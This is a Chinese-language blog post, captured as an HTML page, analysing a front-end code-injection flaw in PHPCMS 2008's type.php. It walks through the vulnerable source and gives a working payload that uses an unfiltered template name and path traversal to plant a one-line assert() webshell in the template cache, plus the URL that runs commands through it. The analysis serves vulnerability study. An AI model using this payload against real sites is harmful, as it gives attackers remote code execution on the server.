@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>phpcms 2008 type.php 前台代码注入getshell漏洞分析 | j2ekim&#39;s Blog | 努力改变，从未放弃。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="PHP,Exploit,getshell">
+    <meta name="description" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
+<meta name="keywords" content="PHP,Exploit,getshell">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
+<meta property="og:url" content="https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/index.html">
+<meta property="og:site_name" content="j2ekim&#39;s Blog">
+<meta property="og:description" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpcms_2008_getshell/rss.tpl.php.png">
+<meta property="og:image" content="https://j2ekim.github.io/img/phpcms_2008_getshell/getshell.png">
+<meta property="og:updated_time" content="2019-07-22T07:51:06.596Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
+<meta name="twitter:description" content="phpcms 2008 type.php 前台代码注入getshell漏洞分析">
+<meta name="twitter:image" content="https://j2ekim.github.io/img/phpcms_2008_getshell/rss.tpl.php.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="j2ekim&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="/css/style.css?v=1.7.2">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/Avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">J2ekim</h5>
+          <a href="mailto:j2ekim@gmail.com" title="j2ekim@gmail.com" class="mail">j2ekim@gmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/j2ekim" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">phpcms 2008 type.php 前台代码注入getshell漏洞分析</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">phpcms 2008 type.php 前台代码注入getshell漏洞分析</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-11-29T01:24:48.000Z" itemprop="datePublished" class="page-time">
+  2018-11-29
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/">Web安全</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/Exploit/">Exploit</a></li></ul></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+
+<article id="post-phpcms_2008_type_php-getshell"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">phpcms 2008 type.php 前台代码注入getshell漏洞分析</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-11-29 09:24:48" datetime="2018-11-29T01:24:48.000Z"  itemprop="datePublished">2018-11-29</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/">Web安全</a><ul class="article-category-list-child"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Web安全/Exploit/">Exploit</a></li></ul></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>phpcms 2008 type.php 前台代码注入getshell漏洞分析<br><a id="more"></a></p>
+<p>tpye.php中:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">require</span> dirname(<span class="keyword">__FILE__</span>).<span class="string">'/include/common.inc.php'</span>;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">empty</span>($template)) $template = <span class="string">'type'</span>;</span><br><span class="line">...</span><br><span class="line"> <span class="keyword">include</span> template(<span class="string">'phpcms'</span>, $template);</span><br><span class="line">...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>先看一下<em>require</em>进来的<em>include/common.inc.php</em>，在这个文件第58行中存在如下代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_REQUEST)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(MAGIC_QUOTES_GPC)</span><br><span class="line">    &#123;</span><br><span class="line">        $_REQUEST = new_stripslashes($_REQUEST);</span><br><span class="line">        <span class="keyword">if</span>($_COOKIE) $_COOKIE = new_stripslashes($_COOKIE);</span><br><span class="line">        extract($db-&gt;escape($_REQUEST), EXTR_SKIP);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        $_POST = $db-&gt;escape($_POST);</span><br><span class="line">        $_GET = $db-&gt;escape($_GET);</span><br><span class="line">        $_COOKIE = $db-&gt;escape($_COOKIE);</span><br><span class="line">        @extract($_POST,EXTR_SKIP);</span><br><span class="line">        @extract($_GET,EXTR_SKIP);</span><br><span class="line">        @extract($_COOKIE,EXTR_SKIP);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!defined(<span class="string">'IN_ADMIN'</span>)) $_REQUEST = filter_xss($_REQUEST, ALLOWED_HTMLTAGS);</span><br><span class="line">    <span class="keyword">if</span>($_COOKIE) $db-&gt;escape($_COOKIE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上面这段代码会通过<em>@extract()</em>将尚未注册的变量进行注册，如果有冲突，不覆盖已有的变量。因此通过这个伪全局可以绕过<em>if(empty($template)) $template = ‘type’;</em>这句话的指定，即<em>$template</em>变量可控。</p>
+<p>跟入<em>template</em>函数，定义在 include/global.func.php:772<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">template</span><span class="params">($module = <span class="string">'phpcms'</span>, $template = <span class="string">'index'</span>, $istag = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</span><br><span class="line">    <span class="keyword">if</span>(TPL_REFRESH &amp;&amp; (!file_exists($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>) &gt; @filemtime($compiledtplfile) || @filemtime(TPL_ROOT.TPL_NAME.<span class="string">'/tag.inc.php'</span>) &gt; @filemtime($compiledtplfile)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">require_once</span> PHPCMS_ROOT.<span class="string">'include/template.func.php'</span>;</span><br><span class="line">        template_compile($module, $template, $istag);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $compiledtplfile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里会进行一些判断，<em>TPL_REFRESH</em>表示是否开启模板缓存自动刷新，默认为1, 剩下的用于判断缓存超时。倘若需要更新缓存则进入了<em>template_compile()</em>函数，根据上一句的<em>require_once</em>可知定义在 include/template.func.php:2<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">template_compile</span><span class="params">($module, $template, $istag = <span class="number">0</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tplfile = TPL_ROOT.TPL_NAME.<span class="string">'/'</span>.$module.<span class="string">'/'</span>.$template.<span class="string">'.html'</span>;</span><br><span class="line">        $content = @file_get_contents($tplfile);</span><br><span class="line">        <span class="keyword">if</span>($content === <span class="keyword">false</span>) showmessage(<span class="string">"$tplfile is not exists!"</span>);</span><br><span class="line">        $compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</span><br><span class="line">        $content = ($istag || substr($template, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">'tag_'</span>) ? <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span> : template_parse($content);</span><br><span class="line">        $strlen = file_put_contents($compiledtplfile, $content);</span><br><span class="line">        @chmod($compiledtplfile, <span class="number">0777</span>);</span><br><span class="line">        <span class="keyword">return</span> $strlen;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>重点看<em>$content = ($istag || substr($template, 0, 4) == ‘tag_’)</em>这一句。由于<em>$template</em>可控，只要<em>$template</em>以<em>tag_</em>开头，就可以使得此处的三元表达式进入到第一个分支中，即相当于：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="string">'&lt;?php function _tag_'</span>.$module.<span class="string">'_'</span>.$template.<span class="string">'($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></span><br></pre></td></tr></table></figure></p>
+<p>由于$template未经过滤，被直接拼接到内容中，所以如果指定<em>tag_(){};@unlink(<em>FILE</em>);assert($_GET[1]);{//../rss</em> ，则拼接后的结果为<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$content = <span class="string">'&lt;?php function _tag_phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss($data, $number, $rows, $count, $page, $pages, $setting)&#123; global $PHPCMS,$MODULE,$M,$CATEGORY,$TYPE,$AREA,$GROUP,$MODEL,$templateid,$_userid,$_username;@extract($setting);?&gt;'</span>.template_parse($content, <span class="number">1</span>).<span class="string">'&lt;?php &#125; ?&gt;'</span></span><br></pre></td></tr></table></figure></p>
+<p>可以看到一句话木马已经写入了<em>$content</em>，之后<em>file_put_contents($compiledtplfile, $content)</em>;将内容写入文件。</p>
+<p>回到前面的template_compile函数中，<em>TPL_CACHEPATH</em>为常量<em>PHPCMS_ROOT.’data/cache_template/</em>; 可知 <em>$compiledtplfile</em> 为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$compiledtplfile = TPL_CACHEPATH.$module.<span class="string">'_'</span>.$template.<span class="string">'.tpl.php'</span>;</span><br><span class="line">```<span class="number">4</span></span><br><span class="line">即：</span><br><span class="line">```php</span><br><span class="line">$compiledtplfile = <span class="string">'data/cache_template/phpcms_tag_()&#123;&#125;;@unlink(_FILE_);assert($_GET[1]);&#123;//../rss.tpl.php'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>所以payload末尾的../利用目录穿越使得最后的<em>$compiledtplfile</em>为<em>‘data/cache_template/rss.tpl.php</em><br><img src="/img/phpcms_2008_getshell/rss.tpl.php.png"><br>为了解析不出错，payload末尾处的//注释了拼接后的其余部分，如上图。</p>
+<p>此后访问 <a href="http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo()" target="_blank" rel="noopener">http://127.0.0.1/phpcms/data/cache_template/rss.tpl.php?1=phpinfo()</a><br><img src="/img/phpcms_2008_getshell/getshell.png"></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-07-22T07:51:06.596Z" itemprop="dateUpdated">2019-07-22 15:51:06</time>
+</span><br>
+
+
+        
+        转载注明来自<a href="/2018/11/29/phpcms_2008_type_php-getshell/" target="_blank" rel="external">https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="https://j2ekim.github.io">
+            <img src="/img/Avatar.jpg" alt="J2ekim">
+            J2ekim
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/getshell/">getshell</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/&title=《phpcms 2008 type.php 前台代码注入getshell漏洞分析》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/&title=《phpcms 2008 type.php 前台代码注入getshell漏洞分析》 — j2ekim's Blog&source=phpcms 2008 type.php 前台代码注入getshell漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《phpcms 2008 type.php 前台代码注入getshell漏洞分析》 — j2ekim's Blog&url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/10/15/Discuz_3_4-Xss/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Discuz v3.4 排行页面存储型XSS漏洞分析</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>J2ekim &copy; 2017 - 2019</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/&title=《phpcms 2008 type.php 前台代码注入getshell漏洞分析》 — j2ekim's Blog&pic=https://j2ekim.github.io/img/Avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/&title=《phpcms 2008 type.php 前台代码注入getshell漏洞分析》 — j2ekim's Blog&source=phpcms 2008 type.php 前台代码注入getshell漏洞分析" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《phpcms 2008 type.php 前台代码注入getshell漏洞分析》 — j2ekim's Blog&url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/&via=https://j2ekim.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://j2ekim.github.io/2018/11/29/phpcms_2008_type_php-getshell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACsUlEQVR42u3aUWorMRAEQN//0nm/AWOne0Zy8qD2yyzKrkqGaNyjxyO+vr5dz3de3X81sr2+P+dx48LDw8NbTD2ZdPLi5zHPI9vp5kuGh4eH9xle8rj3r8kX4v0b8/e+nzMeHh7eX+PlRXbyz31W0OPh4eH9L7zZpNun5ZsEHh4e3m/x9nFDWy4nJfgsGsbDw8O7zZtFqL/7+Up/Dw8PD2/dVZ81wzYrnZTRxWzx8PDwLvDyqeQBQV4Qb4KJfIHw8PDwzvLyuKENavM7bZRcFN94eHh4F3hnQ4f2TlEWB6V8VMTj4eHhrXlJsypvaOVbS3vsIOdFvxXw8PDw1rzkp/7ZPlv73mGcgYeHh3eBN+u5tyOTYPf9ZpO3xCIwHh4e3oKXTyuhJmFEO9HNsQM8PDy8G7ycsSltN4e6NhUyHh4e3g1eXtq28cSqC3dqJnh4eHgXeKeOPZ0KZGctsQiJh4eHd5Q3i1NnW0L+rjz2rbcEPDw8vDVvM9HZ/Tz+yEPkHzYnPDw8vKO8WWDajtzEtW1T7YeSGg8PD2/By+ODWburLX8328PLQ1d4eHh4F3jtoai8FM7ZScxRLyseHh7eBd5sM5iNyRta7aZSHFDAw8PDO8Rrm1uzQ1GzY1j7qAIPDw/vHi9vNc1gLebUJoGHh4d3jzc7YjWLFdrG2JVfCXh4eHiHeLNwdlNwb8ruaLZ4eHh4H+cl4Wx+HGpWlLdLU68BHh4eXsz7Kq+2SbbfMPJvqf7e8PDw8Ea82aP3QUPyefa3eHh4eJ/h5ZtBW/jODmDNyvro0BUeHh7eUd4mVmjb/7PQoY0/8PDw8P4OL7+zD4sPLD0eHh7eH+DlAUQb6SakfDweHh7ebd6m6fU+Ykies98Mjp2MwMPDwwt47Q/+2f38aEIe6R7u7+Hh4eH9zPsHx8+ccWxtEBUAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="/js/main.min.js?v=1.7.2"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="/js/search.min.js?v=1.7.2" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
